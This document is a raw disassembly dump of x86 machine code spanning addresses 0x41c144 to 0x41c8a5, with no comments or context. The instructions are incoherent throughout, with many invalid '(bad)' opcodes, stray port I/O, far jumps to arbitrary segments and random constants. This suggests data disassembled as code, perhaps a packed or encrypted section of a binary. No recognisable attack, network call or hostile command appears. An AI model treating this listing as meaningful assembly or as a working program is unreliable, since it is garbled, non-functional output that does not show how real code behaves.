  41c144:	sbb    DWORD PTR [esi-0x74],ecx
  41c147:	or     edx,DWORD PTR [ebx]
  41c149:	or     eax,0xa543b850
  41c14e:	loope  0x41c1b0
  41c150:	dec    edi
  41c151:	adc    esp,DWORD PTR [edi-0x39]
  41c154:	dec    esp
  41c155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c156:	aam    0x8c
  41c158:	stos   DWORD PTR es:[edi],eax
  41c159:	and    edx,edx
  41c15b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c15c:	rol    ebx,0x1a
  41c15f:	mov    eax,0xa5650839
  41c164:	mov    ch,0xd2
  41c166:	adc    eax,DWORD PTR [edi]
  41c168:	out    0xbe,al
  41c16a:	retf   
  41c16b:	fdiv   DWORD PTR [edi+0x42]
  41c16e:	dec    edi
  41c16f:	scas   eax,DWORD PTR es:[edi]
  41c170:	out    0x15,al
  41c172:	jecxz  0x41c1ae
  41c174:	aam    0x30
  41c176:	pop    esi
  41c177:	sub    edi,DWORD PTR [esi+0x537383b1]
  41c17d:	adc    esi,edi
  41c17f:	inc    di
  41c181:	pop    es
  41c182:	pop    ss
  41c183:	add    BYTE PTR [edx],0xc2
  41c186:	xchg   esi,eax
  41c187:	mov    ebx,esi
  41c189:	or     al,0x6d
  41c18b:	adc    BYTE PTR fs:[ecx-0x80],cl
  41c18f:	lods   al,BYTE PTR ss:[esi]
  41c191:	pop    ss
  41c192:	xor    esp,DWORD PTR [edi+0x5dbbceef]
  41c198:	mov    dl,0xad
  41c19a:	or     edx,DWORD PTR [ebx]
  41c19c:	not    DWORD PTR [ecx+0x67]
  41c19f:	leave  
  41c1a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1a1:	mov    al,ds:0x75c2ec3b
  41c1a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1a7:	js     0x41c1f7
  41c1a9:	loope  0x41c12f
  41c1ab:	cdq    
  41c1ac:	xchg   ebx,eax
  41c1ad:	xor    bl,BYTE PTR [ebp-0x73]
  41c1b0:	in     al,0x71
  41c1b2:	adc    BYTE PTR [edi-0x3fd56e29],dh
  41c1b8:	pop    esi
  41c1b9:	jge    0x41c22f
  41c1bb:	ror    BYTE PTR [edx+eax*4],1
  41c1be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1bf:	ret    0x4776
  41c1c2:	dec    ebp
  41c1c3:	gs sbb eax,0xbd0b946c
  41c1c9:	jg     0x41c15b
  41c1cb:	or     dh,dl
  41c1cd:	aad    0x7f
  41c1cf:	lea    ecx,ds:0x4fc838a9
  41c1d5:	push   ebp
  41c1d6:	adc    al,0xa
  41c1d8:	push   ecx
  41c1d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1da:	icebp  
  41c1db:	dec    edi
  41c1dc:	push   DWORD PTR [eax-0x57]
  41c1df:	xchg   ebp,eax
  41c1e1:	leave  
  41c1e2:	cmp    cl,0x26
  41c1e5:	xchg   cl,dh
  41c1e7:	mov    dh,dh
  41c1e9:	add    eax,0x3af2dcf4
  41c1ee:	sub    edi,ebp
  41c1f0:	loop   0x41c18a
  41c1f2:	(bad)  
  41c1f3:	xchg   esi,eax
  41c1f4:	jecxz  0x41c206
  41c1f6:	pusha  
  41c1f7:	sbb    cl,al
  41c1f9:	sbb    al,0xea
  41c1fb:	xchg   ebp,eax
  41c1fc:	shl    DWORD PTR ds:0xcf9e22af,0x28
  41c203:	sub    DWORD PTR [edx+0xc8c8957],edi
  41c209:	sub    esp,DWORD PTR [esp+edi*1+0x875193]
  41c210:	add    DWORD PTR [ecx+0x67],edx
  41c213:	clc    
  41c214:	push   cs
  41c215:	loop   0x41c1b2
  41c217:	inc    esi
  41c218:	jmp    0x4bc36c2b
  41c21d:	shl    DWORD PTR [ecx+0x31],1
  41c220:	push   ecx
  41c221:	iret   
  41c222:	mov    ds:0x58bc664,al
  41c227:	stos   DWORD PTR es:[edi],eax
  41c228:	add    eax,DWORD PTR [esi]
  41c22a:	dec    eax
  41c22b:	cmp    BYTE PTR [eax],bh
  41c22d:	ret    
  41c22e:	mov    BYTE PTR [ebx*8+0x11d08c51],ch
  41c235:	mov    BYTE PTR [edi+edi*4-0x46],dh
  41c239:	mov    ah,0xf
  41c23b:	push   eax
  41c23c:	xchg   ebp,eax
  41c23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c23e:	pop    ds
  41c23f:	jg     0x41c2af
  41c241:	or     DWORD PTR [ebp-0x16651ce6],ecx
  41c247:	call   0xbc0c6768
  41c24c:	xor    al,0xf9
  41c24e:	mov    ds:0x880256b1,al
  41c253:	mov    esp,0xb438c8e2
  41c258:	adc    BYTE PTR [ebp+edi*2-0x2d],al
  41c25c:	dec    esi
  41c25d:	data16 stc 
  41c25f:	xchg   edx,eax
  41c260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c261:	fistp  WORD PTR [edx-0x66]
  41c264:	daa    
  41c265:	dec    ecx
  41c266:	jecxz  0x41c269
  41c268:	mov    ch,dl
  41c26a:	daa    
  41c26b:	add    DWORD PTR [esi+0x69],0x30ebff77
  41c272:	(bad)  
  41c274:	shl    cl,cl
  41c276:	cmp    eax,0x16857d31
  41c27b:	sub    BYTE PTR [ecx+0x4672f478],cl
  41c281:	mov    ecx,0xc2b0e708
  41c286:	cmp    BYTE PTR [ebx],al
  41c288:	test   BYTE PTR [ebx+0x21],cl
  41c28b:	scas   al,BYTE PTR es:[edi]
  41c28c:	sbb    bh,ah
  41c28e:	mov    al,ds:0x1891dc4b
  41c293:	sbb    BYTE PTR [eax],ch
  41c295:	ret    0xf01c
  41c298:	push   edi
  41c299:	mov    bl,al
  41c29b:	test   BYTE PTR [ebx+edx*2],bh
  41c29e:	(bad)  
  41c29f:	(bad)  
  41c2a0:	addr16 imul eax
  41c2a3:	mov    ch,0xe7
  41c2a5:	imul   edi,DWORD PTR [esi],0x17fa405f
  41c2ab:	sar    ch,cl
  41c2ad:	mov    bl,0x1
  41c2af:	adc    dh,dh
  41c2b1:	jle    0x41c2de
  41c2b3:	(bad)  
  41c2b4:	adc    al,0x9e
  41c2b6:	xor    eax,0xd3f33d66
  41c2bb:	js     0x41c295
  41c2bd:	jp     0x41c289
  41c2bf:	test   eax,0x9141c43a
  41c2c4:	push   cs
  41c2c5:	push   ecx
  41c2c6:	stc    
  41c2c7:	xchg   edi,eax
  41c2c8:	cs or  eax,0x5f9eb8d9
  41c2ce:	jl     0x41c263
  41c2d0:	dec    ebx
  41c2d1:	sub    eax,eax
  41c2d3:	sahf   
  41c2d4:	in     eax,0x54
  41c2d6:	inc    edi
  41c2d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2d8:	mov    es,ecx
  41c2da:	leave  
  41c2db:	fldenv [ebp+esi*4-0x70c9f730]
  41c2e2:	pushf  
  41c2e3:	popf   
  41c2e4:	test   BYTE PTR [ebx+ebp*4-0x3676fde0],bl
  41c2eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2ec:	cmp    bh,BYTE PTR [esi-0x680d4ecd]
  41c2f2:	adc    al,0x52
  41c2f4:	aaa    
  41c2f5:	mov    WORD PTR [edx],gs
  41c2f7:	xchg   BYTE PTR ds:0xba3ef72,dl
  41c2fd:	es jmp 0x41c2eb
  41c300:	fbld   TBYTE PTR [eax]
  41c302:	jecxz  0x41c284
  41c304:	xchg   ebp,eax
  41c305:	dec    esp
  41c306:	cmp    DWORD PTR [ebx-0x361179f6],edi
  41c30c:	push   edi
  41c30d:	jl     0x41c29e
  41c30f:	adc    al,0x32
  41c311:	xchg   ecx,eax
  41c312:	fisttp QWORD PTR [edx+0x69ac3440]
  41c319:	or     DWORD PTR [edx],ebx
  41c31b:	sub    ebx,DWORD PTR [edi+0x716b5930]
  41c321:	xchg   ebx,eax
  41c322:	or     esi,0x7d231d12
  41c328:	xchg   BYTE PTR [ebp+0x7f],ch
  41c32b:	dec    eax
  41c32c:	sub    eax,0xb92bed8d
  41c331:	icebp  
  41c332:	sbb    al,ch
  41c334:	mov    ecx,0xe6d46d9b
  41c339:	inc    edi
  41c33a:	ins    DWORD PTR es:[edi],dx
  41c33b:	mov    ds:0x94de8486,eax
  41c340:	call   0x89eb:0x8339d1ef
  41c347:	pop    esp
  41c348:	stos   BYTE PTR es:[edi],al
  41c349:	or     bh,BYTE PTR [ebx-0x6da40adb]
  41c34f:	fsubp  st(1),st
  41c351:	popa   
  41c352:	mov    dh,0x65
  41c354:	add    esp,DWORD PTR [esp+eax*4]
  41c357:	push   esp
  41c358:	push   edx
  41c359:	mov    ah,0x9
  41c35b:	repnz call 0x3794:0xd80bddf7
  41c363:	test   eax,0xeff7315d
  41c368:	xchg   DWORD PTR [esp+esi*2+0x16],esp
  41c36c:	sub    dh,BYTE PTR [edx+esi*4]
  41c36f:	xchg   ebp,eax
  41c370:	int3   
  41c371:	int3   
  41c372:	and    DWORD PTR [esi+ebx*1],0x9f80d018
  41c379:	sub    al,0xf8
  41c37b:	push   cs
  41c37c:	scas   al,BYTE PTR es:[edi]
  41c37d:	stc    
  41c37e:	enter  0x874d,0x35
  41c382:	pop    edi
  41c383:	into   
  41c384:	call   DWORD PTR [edi-0x42]
  41c387:	(bad)  
  41c388:	neg    BYTE PTR [ecx+ecx*1+0x6d]
  41c38c:	lods   al,BYTE PTR ds:[esi]
  41c38d:	lods   eax,DWORD PTR ds:[esi]
  41c38e:	clc    
  41c38f:	repnz add ah,ah
  41c392:	frstor [edi]
  41c394:	rcr    BYTE PTR [ebx],1
  41c396:	stc    
  41c397:	cdq    
  41c398:	xchg   ebx,eax
  41c399:	xor    bh,ch
  41c39b:	ins    DWORD PTR es:[edi],dx
  41c39c:	scas   eax,DWORD PTR es:[edi]
  41c39d:	shl    bl,0xf8
  41c3a0:	lock rcr BYTE PTR [ebp+0x4d],cl
  41c3a4:	sbb    dl,bh
  41c3a6:	lods   eax,DWORD PTR ds:[esi]
  41c3a7:	push   esi
  41c3a8:	xchg   ebx,eax
  41c3a9:	sbb    al,dh
  41c3ab:	pop    edi
  41c3ac:	xor    al,0xe8
  41c3ae:	fsub   QWORD PTR [ebp+0x3d]
  41c3b1:	in     al,dx
  41c3b2:	(bad)  
  41c3b3:	pop    ss
  41c3b4:	sbb    DWORD PTR [edx+0x6e],edi
  41c3b7:	or     DWORD PTR [eax-0x4f],eax
  41c3ba:	stos   DWORD PTR es:[edi],eax
  41c3bb:	imul   BYTE PTR [ebx]
  41c3bd:	mov    ecx,DWORD PTR ss:[edx+0x6c]
  41c3c1:	fmul   st(0),st
  41c3c3:	mov    bh,0x44
  41c3c5:	call   0x8a5e:0x804cf6db
  41c3cc:	or     BYTE PTR [esi],ah
  41c3ce:	jmp    0xb2f6:0xecd8129c
  41c3d5:	es aas 
  41c3d7:	mov    ebp,0x6280089b
  41c3dc:	jge    0x41c38e
  41c3de:	mov    eax,0x1885b94a
  41c3e3:	or     eax,ebx
  41c3e5:	lods   eax,DWORD PTR ds:[esi]
  41c3e6:	or     ch,cl
  41c3e8:	dec    eax
  41c3e9:	in     al,0x48
  41c3eb:	aas    
  41c3ec:	mov    edi,0xf2d0a85c
  41c3f1:	pop    ebp
  41c3f2:	(bad)  
  41c3f3:	cmp    eax,0x8b6d637e
  41c3f8:	imul   ebx,DWORD PTR [edi-0x4a93d325],0x7dd89894
  41c402:	jnp    0x41c434
  41c404:	xor    edx,edx
  41c406:	xor    eax,ecx
  41c408:	in     eax,0x29
  41c40a:	repz mov dl,0x6d
  41c40d:	xchg   esi,eax
  41c40e:	xor    esi,DWORD PTR [ebx-0x17dd1e46]
  41c414:	pop    esp
  41c415:	neg    BYTE PTR [ecx]
  41c417:	inc    ebp
  41c418:	idiv   BYTE PTR [eax]
  41c41a:	(bad)  
  41c41b:	push   0x7b
  41c41d:	cwde   
  41c41e:	sbb    edx,DWORD PTR [eax-0x65]
  41c421:	in     al,dx
  41c422:	nop
  41c423:	mov    al,0xa9
  41c425:	ds scas eax,DWORD PTR es:[edi]
  41c427:	cmp    BYTE PTR [ebp+ebx*2+0x41],ch
  41c42b:	imul   edi,DWORD PTR [ebx-0x2d853337],0xffffff97
  41c432:	push   ecx
  41c433:	push   0x4717f455
  41c438:	xchg   edx,eax
  41c439:	jno    0x41c3f7
  41c43b:	sbb    ch,BYTE PTR [ecx+0x75f7baef]
  41c441:	imul   BYTE PTR [ebp+0x462a7c80]
  41c447:	jmp    0xb11c746f
  41c44c:	aas    
  41c44d:	ss out 0x9b,eax
  41c450:	enter  0x5dcc,0x2a
  41c454:	jecxz  0x41c486
  41c456:	cmp    DWORD PTR [ebp-0x32],ebx
  41c459:	shr    DWORD PTR [esi-0x34],0xd0
  41c45d:	sbb    BYTE PTR [ebp-0x6cc665d0],ah
  41c463:	or     DWORD PTR [esp+edi*1],ebp
  41c466:	mov    BYTE PTR [eax-0x427f15d2],dh
  41c46c:	xor    eax,0xdc627b41
  41c471:	jecxz  0x41c468
  41c473:	sub    dh,BYTE PTR [edx+edi*8+0x52c50af3]
  41c47a:	mov    edi,0xc3efe847
  41c47f:	mov    BYTE PTR [edx-0x13b86c58],cl
  41c485:	std    
  41c486:	(bad)  
  41c487:	adc    edx,DWORD PTR [esi+0x2f]
  41c48a:	addr16 xchg cl,dl
  41c48d:	add    ebx,DWORD PTR [edx]
  41c48f:	imul   ebp,edi,0xffffff87
  41c492:	outs   dx,DWORD PTR ds:[esi]
  41c493:	jg     0x41c503
  41c495:	out    0x3d,eax
  41c497:	cwde   
  41c498:	pop    eax
  41c499:	dec    eax
  41c49a:	push   0x58dbc538
  41c49f:	adc    bl,BYTE PTR [esi]
  41c4a1:	std    
  41c4a2:	pop    edx
  41c4a3:	fwait
  41c4a4:	mov    ds:0x7d1a0879,eax
  41c4a9:	arpl   WORD PTR [eax-0x13],dx
  41c4ac:	pop    ebx
  41c4ad:	add    dh,BYTE PTR ds:0xa2ccc3c3
  41c4b3:	out    dx,al
  41c4b4:	fdiv   DWORD PTR [ebx+esi*2-0x1]
  41c4b8:	fdiv   QWORD PTR [edx]
  41c4ba:	jle    0x41c4b6
  41c4bc:	sub    BYTE PTR [edi+eax*1-0x16636563],dl
  41c4c3:	jmp    0x5b7f:0x8d5fdd95
  41c4ca:	rol    BYTE PTR [ebx+0x21],0x3f
  41c4ce:	push   0x796ac89e
  41c4d3:	retf   
  41c4d4:	xchg   edi,eax
  41c4d5:	ds ins BYTE PTR es:[edi],dx
  41c4d7:	adc    dl,BYTE PTR [esi+0x1c]
  41c4da:	xchg   ecx,eax
  41c4db:	test   BYTE PTR [ebx+0x7b],ah
  41c4de:	sub    al,0x4
  41c4e0:	push   ebp
  41c4e1:	fcom   QWORD PTR [eax]
  41c4e3:	xchg   ebp,edi
  41c4e5:	retf   0xe227
  41c4e8:	arpl   dx,di
  41c4ea:	add    eax,0x6fa8baaf
  41c4ef:	or     BYTE PTR [ebp+0x2a],ch
  41c4f2:	xchg   edx,eax
  41c4f3:	shl    DWORD PTR [ebp+0x8],0x76
  41c4f7:	push   ebx
  41c4f8:	add    eax,0x1e8ea972
  41c4fd:	outs   dx,BYTE PTR ds:[esi]
  41c4fe:	out    0x30,eax
  41c500:	inc    edi
  41c501:	out    dx,eax
  41c502:	fadd   QWORD PTR [esi+0x5a9eb4b4]
  41c508:	ret    
  41c509:	mov    ds:0x86632473,al
  41c50e:	cmp    eax,0x417a07ce
  41c513:	inc    edi
  41c514:	and    dh,BYTE PTR [edi+0x41]
  41c517:	push   cs
  41c518:	mov    eax,0x9c95ded
  41c51d:	mov    al,0x2f
  41c51f:	pop    esi
  41c520:	(bad)  
  41c521:	call   0xf02f:0x1111da07
  41c528:	inc    esi
  41c529:	ds cld 
  41c52b:	out    dx,al
  41c52c:	in     al,0xd5
  41c52e:	and    al,0x4f
  41c530:	leave  
  41c531:	les    ebp,FWORD PTR [edi+0x42]
  41c534:	pop    ds
  41c535:	mov    esi,?
  41c537:	push   eax
  41c538:	loopne 0x41c53c
  41c53a:	iret   
  41c53b:	add    al,0xce
  41c53d:	sti    
  41c53e:	gs cmp al,0xd6
  41c541:	jp     0x41c59c
  41c543:	xor    eax,0x66
  41c546:	scas   eax,DWORD PTR es:[edi]
  41c547:	stos   DWORD PTR es:[edi],eax
  41c548:	push   0x38
  41c54a:	jecxz  0x41c503
  41c54c:	dec    eax
  41c54e:	mov    edi,0x34c0e3e8
  41c553:	xchg   edx,eax
  41c554:	xchg   ebp,eax
  41c555:	or     BYTE PTR [edx],cl
  41c557:	popa   
  41c558:	sub    BYTE PTR [eax-0x13621d0d],0x78
  41c55f:	std    
  41c560:	in     al,0xb5
  41c562:	popf   
  41c563:	mov    bl,0xb8
  41c565:	pop    esi
  41c566:	mov    ds,WORD PTR [ebx-0x6f]
  41c569:	mov    ebp,0xc0049181
  41c56e:	adc    eax,0xf11c4b3c
  41c573:	in     al,dx
  41c574:	lahf   
  41c575:	xlat   BYTE PTR ds:[ebx]
  41c576:	aas    
  41c577:	in     eax,dx
  41c578:	xor    DWORD PTR [edi],ecx
  41c57a:	xchg   ecx,eax
  41c57b:	or     ah,BYTE PTR [ebx-0x49]
  41c57e:	and    cl,al
  41c580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c581:	cmp    BYTE PTR [ebp+eax*2+0x2c],bl
  41c585:	outs   dx,BYTE PTR ds:[esi]
  41c586:	sbb    DWORD PTR [edi-0x51],edx
  41c589:	sbb    al,0x95
  41c58b:	or     DWORD PTR ds:0xcbae345a,esp
  41c591:	adc    BYTE PTR [ebx+0x42],0x88
  41c595:	inc    esp
  41c596:	retf   
  41c597:	pusha  
  41c598:	repnz mov esi,0x2fbef738
  41c59e:	add    al,0xe4
  41c5a0:	cmp    al,0x24
  41c5a2:	fldcw  WORD PTR [edx]
  41c5a4:	clc    
  41c5a5:	clc    
  41c5a6:	adc    al,0x76
  41c5a8:	push   esi
  41c5a9:	enter  0xed39,0x7b
  41c5ad:	inc    ecx
  41c5ae:	mulps  xmm0,XMMWORD PTR [edx+0x68]
  41c5b2:	xor    DWORD PTR [edi-0x31],edi
  41c5b5:	std    
  41c5b6:	xor    eax,0x46e0a87d
  41c5bb:	jb     0x41c576
  41c5bd:	jg     0x41c633
  41c5bf:	xor    esp,DWORD PTR [eax-0x58fe5934]
  41c5c5:	sub    DWORD PTR [ebp-0x26],ecx
  41c5c8:	jl     0x41c589
  41c5ca:	and    al,0x42
  41c5cc:	icebp  
  41c5cd:	mov    BYTE PTR [edi+0x241dbd98],dh
  41c5d3:	sub    al,bl
  41c5d5:	adc    edx,DWORD PTR ds:0xaf307139
  41c5db:	jl     0x41c59a
  41c5dd:	fwait
  41c5de:	int    0xd3
  41c5e0:	jno    0x41c644
  41c5e2:	inc    BYTE PTR [esi+0x586ca1db]
  41c5e8:	jbe    0x41c579
  41c5ea:	push   ebx
  41c5eb:	or     cl,BYTE PTR [ecx-0x1d5bc03c]
  41c5f1:	ror    BYTE PTR ds:0x5d8e5549,0x6b
  41c5f8:	xlat   BYTE PTR ds:[ebx]
  41c5f9:	dec    edx
  41c5fa:	adc    DWORD PTR [ebx],ebp
  41c5fc:	stos   BYTE PTR es:[edi],al
  41c5fd:	mov    edx,0xaf102b77
  41c602:	(bad)  
  41c603:	retf   
  41c604:	mov    ch,0xd4
  41c606:	data16 jp 0x41c59f
  41c609:	pushf  
  41c60a:	(bad)  
  41c60b:	jmp    FWORD PTR [eax+edx*2-0x54681a15]
  41c612:	scas   al,BYTE PTR es:[edi]
  41c613:	(bad)  
  41c614:	das    
  41c615:	adc    al,0xa2
  41c617:	int3   
  41c618:	test   BYTE PTR [edx],dh
  41c61a:	jns    0x41c5e6
  41c61c:	sub    eax,0x9590895
  41c622:	push   esi
  41c623:	aam    0xa2
  41c625:	sbb    ecx,ebp
  41c627:	jge    0x41c5e0
  41c629:	add    dl,BYTE PTR [ecx+0x45029b14]
  41c62f:	sbb    al,0x43
  41c631:	push   ebp
  41c632:	out    0x9c,eax
  41c634:	in     eax,dx
  41c635:	xchg   DWORD PTR [edx+0x51],esi
  41c638:	inc    edi
  41c639:	call   0xfb878acc
  41c63e:	inc    esp
  41c63f:	cdq    
  41c640:	fld    QWORD PTR [ecx-0x71]
  41c643:	pop    edi
  41c644:	inc    ecx
  41c645:	ss fmul DWORD PTR ds:[edx]
  41c649:	dec    edi
  41c64a:	cs xchg dh,bl
  41c64d:	xchg   esp,eax
  41c64e:	sub    al,0xff
  41c650:	fwait
  41c651:	int    0x3f
  41c653:	xchg   esi,eax
  41c654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c655:	mov    ?,WORD PTR [eax+ebx*8]
  41c658:	(bad)  
  41c659:	jae    0x41c5f7
  41c65b:	mov    DWORD PTR [esi+0x4a],ebp
  41c65e:	pop    esi
  41c65f:	mov    ebp,0xe6039f30
  41c664:	call   0x7443:0x2efe6958
  41c66b:	dec    esp
  41c66c:	dec    ebx
  41c66d:	hlt    
  41c66e:	push   ebx
  41c66f:	ret    
  41c670:	xchg   esp,eax
  41c671:	hlt    
  41c672:	popa   
  41c673:	xchg   edi,eax
  41c674:	lahf   
  41c675:	mov    esi,0x15153ff9
  41c67a:	inc    ebx
  41c67b:	js     0x41c679
  41c67d:	push   ebx
  41c67e:	and    al,BYTE PTR [ebp+0x34]
  41c681:	scas   eax,DWORD PTR es:[edi]
  41c682:	inc    ecx
  41c683:	jl     0x41c6ac
  41c685:	push   ebx
  41c686:	inc    esi
  41c687:	mov    dh,BYTE PTR [edi*1-0x102c4921]
  41c68e:	xor    eax,0xe8bb9917
  41c693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c694:	(bad)  
  41c695:	and    eax,0x330a6a04
  41c69a:	(bad)  
  41c69b:	jp     0x41c67f
  41c69d:	mov    edi,0x341d08e9
  41c6a2:	sub    eax,0x2a754d29
  41c6a7:	arpl   WORD PTR [eax],bp
  41c6a9:	pop    edx
  41c6aa:	out    dx,al
  41c6ab:	pop    ss
  41c6ac:	mov    bh,BYTE PTR [ebp-0x3c3b3f28]
  41c6b2:	(bad)  
  41c6b3:	pop    esi
  41c6b4:	ds mov al,0x3b
  41c6b7:	dec    ebp
  41c6b8:	out    0x47,eax
  41c6ba:	jp     0x41c6ae
  41c6bc:	shl    al,0x7e
  41c6bf:	add    al,0xa7
  41c6c1:	mov    ?,WORD PTR [edx+0x38]
  41c6c4:	mov    DWORD PTR ds:0xa3dd43b,esi
  41c6ca:	pop    eax
  41c6cc:	adc    dl,cl
  41c6ce:	rcl    esi,0xb2
  41c6d1:	std    
  41c6d2:	jg     0x41c752
  41c6d4:	adc    eax,0xc97ea5ce
  41c6d9:	imul   ebx,ecx,0xd2839692
  41c6df:	jmp    0x41c721
  41c6e1:	stos   DWORD PTR es:[edi],eax
  41c6e2:	inc    eax
  41c6e3:	mov    bl,0x49
  41c6e5:	popa   
  41c6e6:	das    
  41c6e7:	cwde   
  41c6e8:	mov    BYTE PTR [eax-0x43be5c5c],bh
  41c6ee:	lahf   
  41c6ef:	push   ecx
  41c6f0:	retf   0x8ec
  41c6f3:	outs   dx,BYTE PTR ds:[esi]
  41c6f4:	loopne 0x41c68c
  41c6f6:	lahf   
  41c6f7:	xor    DWORD PTR [ebx],ebp
  41c6f9:	push   eax
  41c6fa:	add    ecx,DWORD PTR [ecx-0x68d02a5e]
  41c700:	add    cl,dl
  41c702:	mov    esp,ecx
  41c704:	ret    0x50f0
  41c707:	(bad)  
  41c708:	ror    DWORD PTR [ecx],cl
  41c70a:	(bad)  
  41c70b:	cmp    al,ah
  41c70d:	into   
  41c70e:	mov    ebx,0x633021ec
  41c713:	imul   edi,DWORD PTR [edi+0x36],0xffffffd8
  41c717:	sub    edx,DWORD PTR [ebp-0x7bdfbccf]
  41c71d:	(bad)  
  41c71e:	fild   WORD PTR [edx]
  41c720:	and    al,0x5c
  41c722:	cdq    
  41c723:	les    ebx,FWORD PTR [edx+0x3b602673]
  41c729:	jge    0x41c792
  41c72b:	jecxz  0x41c726
  41c72d:	iret   
  41c72e:	mov    ch,0x60
  41c730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c731:	shl    ch,0xfd
  41c734:	mov    ebx,0x175bd779
  41c739:	xchg   ecx,eax
  41c73a:	sbb    DWORD PTR [eax+0x1b],edi
  41c73d:	hlt    
  41c73e:	lock push ebx
  41c740:	add    edi,esp
  41c742:	mov    cl,0x69
  41c744:	popa   
  41c745:	inc    eax
  41c746:	sbb    bl,BYTE PTR ds:0xf9a1466c
  41c74c:	inc    esi
  41c74d:	xor    al,0xbe
  41c74f:	mov    bh,0x1d
  41c751:	outs   dx,BYTE PTR ds:[esi]
  41c752:	add    al,0x2f
  41c754:	(bad)  
  41c756:	ss out dx,al
  41c758:	pop    ss
  41c759:	clc    
  41c75a:	cmp    BYTE PTR ss:[ecx+0x71fe86e5],bl
  41c761:	xor    al,0x80
  41c763:	inc    ebx
  41c764:	sbb    esi,DWORD PTR ds:0x63615c7d
  41c76a:	imul   ebp,DWORD PTR [esi+0x65b50caa],0xb685d08d
  41c774:	push   edx
  41c775:	leave  
  41c776:	mov    esi,0x73d45158
  41c77b:	or     bl,BYTE PTR [eax+eax*4-0x39068465]
  41c782:	mov    ds:0x346fac3e,al
  41c787:	xor    dl,0xe8
  41c78a:	aaa    
  41c78b:	and    cl,BYTE PTR [edi-0x3]
  41c78e:	or     eax,0xfc6534b9
  41c793:	retf   
  41c794:	pop    esi
  41c795:	mov    cl,ah
  41c797:	lock fwait
  41c799:	adc    eax,DWORD PTR [edi+0x6e0b362b]
  41c79f:	pop    ecx
  41c7a0:	xor    DWORD PTR [esi+ebp*1+0x1a],0x2a
  41c7a5:	jno    0x41c7f8
  41c7a7:	xchg   edx,eax
  41c7a8:	pop    eax
  41c7a9:	hlt    
  41c7aa:	sbb    ebx,eax
  41c7ac:	jmp    0x673:0x4508bfd7
  41c7b3:	lods   eax,DWORD PTR ds:[esi]
  41c7b4:	mov    edi,0x9da84801
  41c7b9:	idiv   esi
  41c7bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7bc:	sub    DWORD PTR [ecx-0x126bddfe],ebp
  41c7c2:	scas   al,BYTE PTR es:[edi]
  41c7c3:	stos   BYTE PTR es:[edi],al
  41c7c4:	jbe    0x41c79c
  41c7c6:	(bad)  
  41c7c8:	in     al,dx
  41c7c9:	call   0x39ab:0x9109e06c
  41c7d0:	(bad)  
  41c7d1:	dec    ebx
  41c7d2:	mov    ds:0x2c9a3fd3,eax
  41c7d7:	in     eax,dx
  41c7d8:	cmp    al,0x2f
  41c7da:	ins    BYTE PTR es:[di],dx
  41c7dc:	mov    ah,0xaf
  41c7de:	adc    DWORD PTR [ebx-0x69],ecx
  41c7e1:	lock out 0xa9,al
  41c7e4:	(bad)  
  41c7e5:	sub    esi,edx
  41c7e7:	sub    BYTE PTR [ebx+0xa4caf40],0x90
  41c7ee:	add    BYTE PTR [edx],dl
  41c7f0:	dec    ecx
  41c7f1:	popa   
  41c7f2:	idiv   dh
  41c7f4:	jge    0x41c834
  41c7f6:	add    eax,0xb6691645
  41c7fb:	hlt    
  41c7fc:	sub    DWORD PTR [ecx+edi*2],ebx
  41c7ff:	mov    al,0xc
  41c801:	push   esp
  41c802:	mov    esi,0x833eca84
  41c807:	mov    ebp,ebp
  41c809:	nop
  41c80a:	mov    ebp,0x18caf396
  41c80f:	push   ebx
  41c810:	or     ebx,DWORD PTR [esi-0x47]
  41c813:	pushf  
  41c814:	mov    ecx,0xd1b3b04f
  41c819:	cwde   
  41c81a:	jae    0x41c878
  41c81c:	xchg   ebx,eax
  41c81d:	jno    0x41c829
  41c81f:	aam    0xd2
  41c821:	in     al,dx
  41c822:	in     eax,0xfe
  41c824:	add    BYTE PTR [si],0x2a
  41c828:	sub    esi,ebx
  41c82a:	aaa    
  41c82b:	mov    bh,0xc7
  41c82d:	pop    di
  41c82f:	fwait
  41c830:	in     al,dx
  41c831:	mov    bh,BYTE PTR [edx-0x32580cab]
  41c837:	pop    esp
  41c838:	ins    BYTE PTR es:[edi],dx
  41c839:	push   ecx
  41c83a:	sti    
  41c83b:	xor    DWORD PTR ss:[esi+ebx*2],0x36a7a4fd
  41c843:	test   DWORD PTR [ebx+0x3d],esp
  41c846:	add    ebx,ebp
  41c848:	mov    ebp,0x166c9e3b
  41c84d:	outs   dx,DWORD PTR ds:[esi]
  41c84e:	mov    cl,0xa4
  41c850:	neg    DWORD PTR [edx+esi*2+0x1e]
  41c854:	(bad)  
  41c855:	and    bl,bh
  41c857:	push   esi
  41c858:	mov    dh,0x95
  41c85a:	mov    ecx,0xc0f13e1c
  41c85f:	addr16 push ss
  41c861:	jecxz  0x41c849
  41c863:	xchg   BYTE PTR [ebx+0x29],bh
  41c866:	mov    al,0xaf
  41c868:	dec    ebx
  41c869:	dec    eax
  41c86a:	mov    dl,0x72
  41c86c:	inc    edx
  41c86d:	jmp    0xacc4:0x285625dd
  41c874:	xor    eax,0xcd8051a4
  41c879:	cmp    DWORD PTR [ebx+0x1872229f],ecx
  41c87f:	pop    ebp
  41c880:	jmp    0x4e47:0x99523fb6
  41c887:	xor    dh,BYTE PTR [ecx+0x4f4614f6]
  41c88d:	mov    bh,0xd9
  41c88f:	arpl   WORD PTR [edi],si
  41c891:	out    0x92,eax
  41c893:	ds add eax,0xa788f8e6
  41c899:	mov    ch,0xdd
  41c89b:	shl    DWORD PTR [ebx],cl
  41c89d:	fisttp DWORD PTR [esi]
  41c89f:	mov    esp,0xd644e28c
  41c8a4:	sahf   
  41c8a5:	ins    BYTE PTR es:[edi],dx
